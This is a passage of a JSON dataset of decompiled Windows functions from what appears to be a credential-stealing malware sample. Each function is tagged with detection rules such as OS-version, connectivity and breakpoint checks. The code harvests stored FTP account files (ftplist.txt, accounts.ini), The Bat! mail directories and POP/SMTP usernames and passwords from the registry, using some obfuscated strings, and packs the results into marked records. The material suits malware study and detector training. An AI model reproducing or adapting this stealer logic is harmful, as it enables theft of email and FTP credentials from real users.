        "decompiled_code": "\nvoid __cdecl fcn.0040e1b7(uint hKey, uint lpSubKey, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint phkResult;\n    \n    iVar1 = sub.advapi32.dll_RegOpenKeyA(hKey, lpSubKey, &phkResult);\n    if (iVar1 == 0) {\n        var_8h = fcn.00401b82(hKey, lpSubKey, \"Site\", 0);\n        var_ch = fcn.00401b82(hKey, lpSubKey, \"UserID\", 0);\n        var_10h = fcn.00401b82(hKey, lpSubKey, \"xflags\", &var_1ch);\n        var_14h = fcn.00401b82(hKey, lpSubKey, \"Port\", 0);\n        var_18h = fcn.00401b82(hKey, lpSubKey, \"Folder\", 0);\n        if ((var_10h != 0) && (var_1ch != 0)) {\n            iVar1 = fcn.0040292f(var_10h, var_1ch);\n            if (iVar1 != 0) {\n                var_1ch = var_1ch >> 1;\n                iVar1 = fcn.004040d7(var_10h, &var_1ch, 0);\n                if ((((iVar1 != 0) && (var_8h != 0)) && (var_ch != 0)) && (var_10h != 0)) {\n                    fcn.00401522(arg_10h, 0xbeef0000);\n                    fcn.00401584(arg_10h, var_8h);\n                    fcn.00401584(arg_10h, var_ch);\n                    fcn.00401558(arg_10h, var_10h, var_1ch);\n                    fcn.00401584(arg_10h, var_14h);\n                    fcn.00401584(arg_10h, var_18h);\n                }\n            }\n        }\n        fcn.0040178e(var_8h);\n        fcn.0040178e(var_ch);\n        fcn.0040178e(var_10h);\n        fcn.0040178e(var_14h);\n        fcn.0040178e(var_18h);\n        sub.advapi32.dll_RegCloseKey(phkResult);\n    }\n    return;\n}\n",
        "token_count": 583
    },
    "0040e300": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e300(uint hKey, uint lpSubKey, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_818h;\n    int32_t var_814h;\n    int32_t pszFirst;\n    uint lpValueName;\n    uint var_ch;\n    int32_t dwIndex;\n    uint phkResult;\n    \n    iVar1 = sub.advapi32.dll_RegOpenKeyA(hKey, lpSubKey, &phkResult);\n    if (iVar1 == 0) {\n        dwIndex = 0;\n        while( true ) {\n            var_ch = 0x7ff;\n            iVar1 = sub.advapi32.dll_RegEnumValueA();\n            if (iVar1 != 0) break;\n            if (var_814h == 1) {\n                iVar1 = fcn.00401b82(hKey, lpSubKey, &lpValueName, &var_818h);\n                if (iVar1 != 0) {\n                    pszFirst = iVar1;\n                    iVar1 = sub.shlwapi.dll_StrStrIA(iVar1, \".wjf\");\n                    if (iVar1 != 0) {\n                        fcn.0040e07e(arg_10h, pszFirst);\n                    }\n                    fcn.0040178e(pszFirst);\n                }\n                dwIndex = dwIndex + 1;\n            }\n            else {\n                dwIndex = dwIndex + 1;\n            }\n        }\n        sub.advapi32.dll_RegCloseKey(phkResult);\n    }\n    return;\n}\n",
        "token_count": 334
    },
    "0040e468": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e468(uint arg_8h)\n\n{\n    char cVar1;\n    uint arg_ch;\n    int32_t iVar2;\n    uint arg_ch_00;\n    char *lpString;\n    char *pcVar3;\n    char *pcVar4;\n    uint hMem;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x55, 0);\n    cVar1 = **0x41205d;\n    lpString = *0x412059;\n    pcVar4 = *0x41205d;\n    do {\n        if (cVar1 == '\\0') {\n            fcn.004015ef(arg_8h, arg_ch);\n            return;\n        }\n        iVar2 = sub.shlwapi.dll_StrStrIA();\n        if (iVar2 != 0) {\n            arg_ch_00 = fcn.0040223e(lpString);\n            hMem = arg_8h;\n            fcn.0040404c(arg_8h, arg_ch_00, \"project.ini\", 0xbeef0000);\n            fcn.0040178e(hMem);\n        }\n        for (; *lpString != '\\0'; lpString = lpString + 1) {\n        }\n        lpString = lpString + 1;\n        iVar2 = -1;\n        pcVar3 = pcVar4;\n        do {\n            pcVar4 = pcVar3;\n            if (iVar2 == 0) break;\n            iVar2 = iVar2 + -1;\n            pcVar4 = pcVar3 + 1;\n            cVar1 = *pcVar3;\n            pcVar3 = pcVar4;\n        } while (cVar1 != '\\0');\n        cVar1 = *pcVar4;\n    } while( true );\n}\n",
        "token_count": 398
    },
    "0040e4e6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e4e6(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    uint var_8h;\n    uint lpString;\n    \n    if (*0x412418 == NULL) {\n        return;\n    }\n    lpString = fcn.004017a5(0x105);\n    var_8h = 0x104;\n    (**0x412418)(arg_ch, arg_ch, lpString, &var_8h);\n    uVar1 = sub.kernel32.dll_lstrlenA(lpString);\n    if (3 < uVar1) {\n        fcn.0040404c(arg_8h, lpString, \".xml\", 0xbeef0000);\n    }\n    fcn.0040178e(lpString);\n    return;\n}\n",
        "token_count": 178
    },
    "0040e5ba": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e5ba(uchar *arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    uint8_t *puVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    char *pcVar8;\n    ulong uVar9;\n    uint in_stack_ffffff48;\n    uchar *in_stack_ffffff4c;\n    uint var_2ch;\n    uint var_28h;\n    uint32_t var_24h;\n    uint var_20h;\n    uint32_t var_1ch;\n    char *lpString;\n    char *var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    iVar3 = fcn.00401d47(arg_ch);\n    if (iVar3 == 0) {\n        return;\n    }\n    str.__OP3_Password2[1] = 0x50;\n    *0x41437d = 0x53;\n    iVar3 = fcn.00401e0f(arg_ch, &var_10h);\n    if (iVar3 != 0) {\n        var_24h = var_4h >> 1;\n        pcVar4 = fcn.00402860(var_8h, var_24h);\n        var_14h = pcVar4;\n        if (pcVar4 == NULL) {\n            var_14h = fcn.004017a5(var_4h);\n            fcn.004017dc(var_8h, var_14h, var_4h);\n            pcVar4 = var_14h;\n        }\n        while ((pcVar4 != NULL && (*pcVar4 != '\\0'))) {\n            pcVar4 = \"<_OP3_Password2\";\n            while (iVar3 = sub.shlwapi.dll_StrStrA(),  iVar3 == 0) {\n                iVar3 = -1;\n                pcVar8 = pcVar4;\n                do {\n                    pcVar4 = pcVar8;\n                    if (iVar3 == 0) break;\n                    iVar3 = iVar3 + -1;\n                    pcVar4 = pcVar8 + 1;\n                    cVar1 = *pcVar8;\n                    pcVar8 = pcVar4;\n                } while (cVar1 != '\\0');\n                if (*pcVar4 == '\\0') goto code_r0x0040e723;\n            }\n            iVar3 = sub.shlwapi.dll_StrStrIA();\n            if (iVar3 == 0) break;\n            lpString = iVar3 + 1;\n            uVar9 = sub.shlwapi.dll_StrStrA();\n            puVar5 = uVar9;\n            if (puVar5 == NULL) break;\n            uVar2 = *puVar5;\n            *puVar5 = 0;\n            uVar6 = sub.kernel32.dll_lstrlenA(lpString, uVar9 >> 0x20 & 0xffffff00 | uVar2, puVar5);\n            if (uVar6 != 0) {\n                var_1ch = uVar6;\n                var_20h = fcn.0040283f(lpString);\n                iVar7 = fcn.0040292f(var_20h, var_1ch);\n                if (iVar7 != 0) {\n                    var_1ch = var_1ch >> 1;\n                    var_28h = *0x41435f;\n                    var_2ch = *0x414363;\n                    iVar7 = fcn.004040d7(var_20h, &var_1ch, &var_2ch);\n                    if (iVar7 != 0) {\n                        fcn.00401522(arg_8h, 0xbeef0001);\n                        fcn.00401584(arg_8h, lpString);\n                        in_stack_ffffff4c = arg_8h;\n                        fcn.00401558(arg_8h, var_20h, var_1ch);\n                    }\n                }\n                in_stack_ffffff48 = var_20h;\n                fcn.0040178e(var_20h);\n            }\n            *in_stack_ffffff4c = in_stack_ffffff48;\n            pcVar4 = iVar3 + 1;\n        }\ncode_r0x0040e723:\n        fcn.00401522(arg_8h, 0xbeef0002);\n        fcn.00401558(arg_8h, var_8h, var_4h);\n        fcn.0040178e(var_14h);\n        fcn.00401ea4(&var_10h);\n    }\n    return;\n}\n",
        "token_count": 1027
    },
    "0040e987": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e987(uint hKey, uint lpSubKey, uint arg_10h)\n\n{\n    uint arg_ch;\n    int32_t iVar1;\n    uint uVar2;\n    uint arg_ch_00;\n    uint32_t uVar3;\n    uint in_stack_fffff75c;\n    uint var_818h;\n    uint var_814h;\n    uint var_810h;\n    uint lpName;\n    uint var_ch;\n    int32_t dwIndex;\n    uint phkResult;\n    \n    arg_ch = fcn.004017a5(0x105);\n    iVar1 = sub.advapi32.dll_RegOpenKeyA(hKey, lpSubKey, &phkResult);\n    if (iVar1 == 0) {\n        dwIndex = 0;\n        while( true ) {\n            var_ch = 0x7ff;\n            iVar1 = sub.advapi32.dll_RegEnumKeyExA(phkResult, dwIndex, &lpName, &var_ch, 0, 0, 0, 0);\n            if (iVar1 != 0) break;\n            uVar2 = fcn.00401c09(lpSubKey, 0x4120b1);\n            arg_ch_00 = fcn.00401c09(uVar2, &lpName);\n            fcn.0040178e(uVar2);\n            iVar1 = fcn.00401b82(hKey, arg_ch_00, \"Path\", 0);\n            if (iVar1 != 0) {\n                uVar2 = fcn.00401c09(iVar1, \"\\\\PocoSystem.ini\");\n                uVar3 = sub.kernel32.dll_GetPrivateProfileStringA\n                                  (\"Program\", \"DataPath\", 0x4120b3, arg_ch, 0x104, uVar2, uVar2);\n                if (3 < uVar3) {\n                    in_stack_fffff75c = arg_10h;\n                    fcn.0040404c(arg_10h, arg_ch, \"accounts.ini\", 0xbeef0000);\n                }\n                fcn.0040178e(in_stack_fffff75c);\n            }\n            fcn.0040e987(hKey, arg_ch_00, arg_10h);\n            fcn.0040178e(arg_ch_00);\n            fcn.0040178e(iVar1);\n            dwIndex = dwIndex + 1;\n        }\n        sub.advapi32.dll_RegCloseKey();\n    }\n    fcn.0040178e(arg_ch);\n    return;\n}\n",
        "token_count": 558
    },
    "0040eb31": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040eb31(uint hKey, uint lpSubKey, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint lpString2;\n    int32_t var_848h;\n    uint var_844h;\n    uint var_840h;\n    uint var_83ch;\n    uint var_838h;\n    uint var_834h;\n    int32_t var_830h;\n    uint var_82ch;\n    uint var_828h;\n    uint var_824h;\n    uint var_820h;\n    uint var_81ch;\n    uint var_818h;\n    int32_t var_814h;\n    uint var_810h;\n    uint lpName;\n    uint var_ch;\n    int32_t dwIndex;\n    uint phkResult;\n    \n    iVar1 = sub.advapi32.dll_RegOpenKeyA(hKey, lpSubKey, &phkResult);\n    if (iVar1 == 0) {\n        dwIndex = 0;\n        while( true ) {\n            var_ch = 0x7ff;\n            iVar1 = sub.advapi32.dll_RegEnumKeyExA(phkResult, dwIndex, &lpName, &var_ch, 0, 0, 0, 0);\n            if (iVar1 != 0) break;\n            lpString2 = fcn.00401c09(lpSubKey, 0x4120b1);\n            var_810h = fcn.00401c5d(lpString2, &lpName);\n            var_814h = fcn.00401b82(hKey, var_810h, \"EmailAddress\", 0);\n            var_818h = fcn.00401b82(hKey, var_810h, \"Technology\", 0);\n            var_81ch = fcn.00401b82(hKey, var_810h, \"PopServer\", 0);\n            var_820h = fcn.00401b82(hKey, var_810h, \"PopPort\", &var_824h);\n            var_828h = fcn.00401b82(hKey, var_810h, \"PopAccount\", 0);\n            var_82ch = fcn.00401b82(hKey, var_810h, \"PopPassword\", &var_830h);\n            var_834h = fcn.00401b82(hKey, var_810h, \"_mtpServer\", 0);\n            var_838h = fcn.00401b82(hKey, var_810h, \"_mtpPort\", &var_83ch);\n            var_840h = fcn.00401b82(hKey, var_810h, \"_mtpAccount\", 0);\n            var_844h = fcn.00401b82(hKey, var_810h, \"_mtpPassword\", &var_848h);\n            if ((var_814h != 0) && ((var_830h != 0 || (var_848h != 0)))) {\n                fcn.00401522(arg_10h, 0xbeef0000);\n                fcn.00401584(arg_10h, var_814h);\n                fcn.00401584(arg_10h, var_818h);\n                fcn.00401584(arg_10h, var_81ch);\n                fcn.00401558(arg_10h, var_820h, var_824h);\n                fcn.00401584(arg_10h, var_828h);\n                fcn.00401558(arg_10h, var_82ch, var_830h);\n                fcn.00401584(arg_10h, var_834h);\n                fcn.00401558(arg_10h, var_838h, var_83ch);\n                fcn.00401584(arg_10h, var_840h);\n                fcn.00401558(arg_10h, var_844h, var_848h);\n            }\n            fcn.0040eb31(hKey, var_810h, arg_10h);\n            fcn.0040178e(var_810h);\n            fcn.0040178e(var_814h);\n            fcn.0040178e(var_818h);\n            fcn.0040178e(var_81ch);\n            fcn.0040178e(var_820h);\n            fcn.0040178e(var_828h);\n            fcn.0040178e(var_82ch);\n            fcn.0040178e(var_834h);\n            fcn.0040178e(var_838h);\n            fcn.0040178e(var_840h);\n            fcn.0040178e(var_844h);\n            dwIndex = dwIndex + 1;\n        }\n        sub.advapi32.dll_RegCloseKey(phkResult);\n    }\n    return;\n}\n",
        "token_count": 1062
    },
    "0040ef16": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ef16(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t var_3ch;\n    uint ARG_0;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint32_t *var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.00401b82(arg_ch, \"Software\\\\RIT\\\\The Bat!\", \"Working Directory\", 0);\n    if (iVar1 != 0) {\n        var_4h = iVar1;\n        fcn.0040eea1(arg_8h, iVar1);\n        fcn.0040178e(var_4h);\n    }\n    iVar1 = fcn.00401b82(arg_ch, \"Software\\\\RIT\\\\The Bat!\", \"ProgramDir\", 0);\n    if (iVar1 != 0) {\n        var_4h = iVar1;\n        fcn.0040eea1(arg_8h, iVar1);\n        fcn.0040178e(var_4h);\n    }\n    iVar1 = fcn.00401b82(arg_ch, \"Software\\\\RIT\\\\The Bat!\\\\Users depot\", \"Default\", 0);\n    if (iVar1 != 0) {\n        var_4h = iVar1;\n        fcn.0040eea1(arg_8h, iVar1);\n        fcn.0040178e(var_4h);\n    }\n    var_8h = fcn.00401b82(arg_ch, \"Software\\\\RIT\\\\The Bat!\\\\Users depot\", \"Count\", &var_ch);\n    if (var_8h != NULL) {\n        if (var_ch == 4) {\n            var_10h = *var_8h;\n            if (10000 < var_10h) {\n                var_10h = 10000;\n            }\n            for (; var_10h != 0; var_10h = var_10h - 1) {\n                sub.user32.dll_wsprintfA(&ARG_0, \"Dir #%d\", var_10h);\n                iVar1 = fcn.00401b82(arg_ch, \"Software\\\\RIT\\\\The Bat!\\\\Users depot\", &ARG_0, &var_3ch);\n                if (iVar1 != 0) {\n                    var_4h = iVar1;\n                    if (3 < var_3ch) {\n                        fcn.0040eea1(arg_8h, iVar1);\n                    }\n                    fcn.0040178e(var_4h);\n                }\n            }\n        }\n        fcn.0040178e(var_8h);\n    }\n    return;\n}\n",
        "token_count": 588
    },
    "0040f122": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040f122(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    uint32_t uVar5;\n    char *pcVar6;\n    uint in_stack_ffffffb4;\n    uint uVar7;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    uVar5 = 0;\n    pcVar6 = \"RLUQ!Dl`hm!@eesdrr\";\n    do {\n        iVar2 = fcn.00401b82(arg_ch, arg_10h, pcVar6, &fcn.0040f122::var_4h);\n        if (iVar2 != 0) {\n            uVar7 = arg_8h;\n            uVar3 = fcn.0040f0d8(arg_8h, pcVar6, iVar2, var_4h, 0xbeef0000);\n            uVar5 = uVar5 | uVar3;\n            fcn.0040178e(uVar7);\n        }\n        iVar2 = -1;\n        pcVar4 = pcVar6;\n        do {\n            pcVar6 = pcVar4;\n            if (iVar2 == 0) break;\n            iVar2 = iVar2 + -1;\n            pcVar6 = pcVar4 + 1;\n            cVar1 = *pcVar4;\n            pcVar4 = pcVar6;\n        } while (cVar1 != '\\0');\n    } while (*pcVar6 != '\\0');\n    pcVar6 = \"QNQ2!Q`rrvnse3\";\n    do {\n        iVar2 = fcn.00401b82(arg_ch, arg_10h, pcVar6, &fcn.0040f122::var_4h);\n        if (iVar2 != 0) {\n            fcn.00401522(arg_8h, 0xbeef0003);\n            fcn.00401584(arg_8h, pcVar6);\n            uVar7 = arg_8h;\n            fcn.00401558(arg_8h, iVar2, var_4h);\n            in_stack_ffffffb4 = 0x40f1b4;\n            fcn.0040178e(uVar7);\n            uVar5 = uVar5 | 1;\n        }\n        iVar2 = -1;\n        pcVar4 = pcVar6;\n        do {\n            pcVar6 = pcVar4;\n            if (iVar2 == 0) break;\n            iVar2 = iVar2 + -1;\n            pcVar6 = pcVar4 + 1;\n            cVar1 = *pcVar4;\n            pcVar4 = pcVar6;\n        } while (cVar1 != '\\0');\n    } while (*pcVar6 != '\\0');\n    pcVar6 = \"QNQ2!Q`rrvnse\";\n    do {\n        pcVar4 = fcn.00401b82(arg_ch, arg_10h, pcVar6, &fcn.0040f122::var_4h);\n        if (pcVar4 != NULL) {\n            if (1 < var_4h) {\n                if (*pcVar4 == '\\x01') {\n                    var_4h = var_4h - 1;\n                    uVar3 = fcn.0040f0d8(arg_8h, pcVar6, pcVar4 + 1, var_4h, 0xbeef0001);\n                    uVar5 = uVar5 | uVar3;\n                }\n                else if (*pcVar4 == '\\x02') {\n                    var_4h = var_4h - 1;\n                    iVar2 = fcn.004040d7(pcVar4 + 1, &fcn.0040f122::var_4h, 0);\n                    if (iVar2 != 0) {\n                        in_stack_ffffffb4 = arg_8h;\n                        uVar3 = fcn.0040f0d8(arg_8h, pcVar6, pcVar4 + 1, var_4h, 0xbeef0002);\n                        uVar5 = uVar5 | uVar3;\n                    }\n                }\n            }\n            fcn.0040178e(in_stack_ffffffb4);\n        }\n        iVar2 = -1;\n        pcVar4 = pcVar6;\n        do {\n            pcVar6 = pcVar4;\n            if (iVar2 == 0) break;\n            iVar2 = iVar2 + -1;\n            pcVar6 = pcVar4 + 1;\n            cVar1 = *pcVar4;\n            pcVar4 = pcVar6;\n        } while (cVar1 != '\\0');\n    } while (*pcVar6 != '\\0');\n    pcVar6 = \"QNQ2!Qnsu\";\n    do {\n        iVar2 = fcn.00401b82(arg_ch, arg_10h, pcVar6, &fcn.0040f122::var_4h);\n        if (iVar2 != 0) {\n            fcn.00401522(arg_8h, 0xbeef0004);\n            fcn.00401584(arg_8h, pcVar6);\n            uVar7 = arg_8h;\n            fcn.00401558(arg_8h, iVar2, var_4h);\n            fcn.0040178e(uVar7);\n            uVar5 = uVar5 | 1;\n        }\n        iVar2 = -1;\n        pcVar4 = pcVar6;\n        do {\n            pcVar6 = pcVar4;\n            if (iVar2 == 0) break;\n            iVar2 = iVar2 + -1;\n            pcVar6 = pcVar4 + 1;\n            cVar1 = *pcVar4;\n            pcVar4 = pcVar6;\n        } while (cVar1 != '\\0');\n        if (*pcVar6 == '\\0') {\n            if (uVar5 != 0) {\n                fcn.00401522(arg_8h, 0xbeef0010);\n            }\n            return uVar5;\n        }\n    } while( true );\n}\n",
        "token_count": 1362
    },
    "0040f3fe": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0040f3fe(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint *arg_1ch, int32_t arg_20h)\n\n{\n    int32_t lpString;\n    int32_t lpString_00;\n    uint var_6ch;\n    uint var_68h;\n    uint ARG_0;\n    \n    lpString = fcn.004028cc(arg_ch);\n    if (lpString != 0) {\n        sub.user32.dll_wsprintfA\n                  (&ARG_0, \"{%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}\", *arg_1ch, *(arg_1ch + 1), \n                   *(arg_1ch + 6), *(arg_1ch + 2), *(arg_1ch + 9), *(arg_1ch + 10), *(arg_1ch + 0xb), *(arg_1ch + 3), \n                   *(arg_1ch + 0xd), *(arg_1ch + 0xe), *(arg_1ch + 0xf));\n        if (arg_20h == 0) {\n            fcn.00401522(arg_18h, arg_8h);\n            fcn.00401584(arg_18h, lpString);\n            fcn.00401584(arg_18h, &ARG_0);\n            fcn.00401558(arg_18h, arg_10h, arg_14h);\n        }\n        else {\n            lpString_00 = fcn.004028dd(arg_10h, arg_14h);\n            if (lpString_00 != 0) {\n                fcn.00401522(arg_18h, arg_8h);\n                fcn.00401584(arg_18h, lpString);\n                fcn.00401584(arg_18h, &ARG_0);\n                fcn.00401584(arg_18h, lpString_00);\n                fcn.0040178e(lpString_00);\n            }\n        }\n        fcn.0040178e(lpString);\n        return;\n    }\n    return;\n}\n",
        "token_count": 495
    },
    "0040f4ed": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040f4ed(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t *arg_18h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint *var_c1ch;\n    int32_t var_c18h;\n    int32_t var_c14h;\n    uint var_c10h;\n    uint var_c0ch;\n    uint var_c08h;\n    uint var_c04h;\n    uint var_c00h;\n    uint var_800h;\n    uint var_400h;\n    \n    fcn.00409e16(arg_8h, &var_400h, arg_18h);\n    fcn.00409e61(arg_8h, arg_ch, &var_800h, arg_18h);\n    sub.kernel32.dll_WideCharToMultiByte(0, 0, arg_10h, 0xffffffff, &var_c00h, 0x3ff, 0, 0);\n    var_c10h = 0x10;\n    var_c0ch = 2;\n    var_c08h = 0;\n    var_c04h = 0;\n    (**(*arg_18h + 0x44))(arg_18h, 0, arg_8h, arg_ch, arg_10h, &var_c18h, &var_c14h, &var_c10h, 0);\n    if (var_c18h == 0) {\n        return;\n    }\n    if (var_c14h == 0) {\n        return;\n    }\n    iVar1 = sub.kernel32.dll_lstrcmpiA(&var_400h, \"identification\");\n    if (iVar1 != 0) {\n        puVar2 = &var_400h;\n        iVar1 = sub.kernel32.dll_lstrcmpiA(puVar2, \"identitymgr\");\n        if (iVar1 != 0) goto code_r0x0040f687;\n    }\n    var_c1ch = 0xbeef0005;\n    iVar1 = sub.kernel32.dll_lstrcmpiA();\n    if (iVar1 != 0) {\n        var_c1ch = 0xbeef0006;\n        iVar1 = sub.kernel32.dll_lstrcmpiA();\n        if (iVar1 != 0) {\n            var_c1ch = 0xbeef0007;\n            puVar2 = &var_800h;\n            iVar1 = sub.kernel32.dll_lstrcmpiA();\n            if (iVar1 != 0) goto code_r0x0040f687;\n        }\n    }\n    if (var_c1ch == 0xbeef0007) {\n        fcn.0040f3fe(0xbeef0007, arg_10h, var_c14h, var_c18h, arg_14h, arg_ch, 0);\n        puVar2 = var_c1ch;\n    }\n    else {\n        fcn.0040f3fe(var_c1ch, arg_10h, var_c14h, var_c18h, arg_14h, arg_ch, 1);\n        puVar2 = var_c1ch;\n    }\ncode_r0x0040f687:\n    sub.ole32.dll_CoTaskMemFree(var_c14h, puVar2);\n    return;\n}\n",
        "token_count": 730
    },
    "0040f696": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040f696(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *var_4h;\n    \n    if (*0x41241c != NULL) {\n        var_4h = NULL;\n        iVar1 = (**0x41241c)(&var_4h, 0, 0, 0);\n        if ((-1 < iVar1) && (var_4h != NULL)) {\n            fcn.00409fcb(arg_8h, var_4h, fcn.0040f4ed);\n            (**(*var_4h + 8))(var_4h);\n        }\n    }\n    return;\n}\n",
        "token_count": 152
    },
    "0040f8d6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040f8d6(uint arg_8h)\n\n{\n    char cVar1;\n    uint arg_ch;\n    int32_t iVar2;\n    uint arg_ch_00;\n    char *lpString;\n    char *pcVar3;\n    char *pcVar4;\n    uint hMem;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x60, 0);\n    cVar1 = **0x41205d;\n    lpString = *0x412059;\n    pcVar4 = *0x41205d;\n    do {\n        if (cVar1 == '\\0') {\n            fcn.004015ef(arg_8h, arg_ch);\n            return;\n        }\n        iVar2 = sub.shlwapi.dll_StrStrIA();\n        if (iVar2 != 0) {\n            arg_ch_00 = fcn.0040223e(lpString);\n            hMem = arg_8h;\n            fcn.0040404c(arg_8h, arg_ch_00, \"ftplist.txt\", 0xbeef0000);\n            fcn.0040178e(hMem);\n        }\n        for (; *lpString != '\\0'; lpString = lpString + 1) {\n        }\n        lpString = lpString + 1;\n        iVar2 = -1;\n        pcVar3 = pcVar4;\n        do {\n            pcVar4 = pcVar3;\n            if (iVar2 == 0) break;\n            iVar2 = iVar2 + -1;\n            pcVar4 = pcVar3 + 1;\n            cVar1 = *pcVar3;\n            pcVar3 = pcVar4;\n        } while (cVar1 != '\\0');\n        cVar1 = *pcVar4;\n    } while( true );\n}\n",
        "token_count": 401
    },
    "004101ed": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00410206)\n// WARNING: Removing unreachable block (ram,0x00410228)\n// WARNING: Removing unreachable block (ram,0x00410230)\n// WARNING: Removing unreachable block (ram,0x004102ed)\n// WARNING: Removing unreachable block (ram,0x00410235)\n// WARNING: Removing unreachable block (ram,0x00410278)\n// WARNING: Removing unreachable block (ram,0x00410286)\n// WARNING: Removing unreachable block (ram,0x0041027d)\n// WARNING: Removing unreachable block (ram,0x00410297)\n// WARNING: Removing unreachable block (ram,0x004102f6)\n\nulong __fastcall fcn.004101ed(uint param_1, uint param_2)\n\n{\n    uint in_EAX;\n    \n    return CONCAT44(in_EAX, param_2);\n}\n",
        "token_count": 193
    },
    "0041029c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
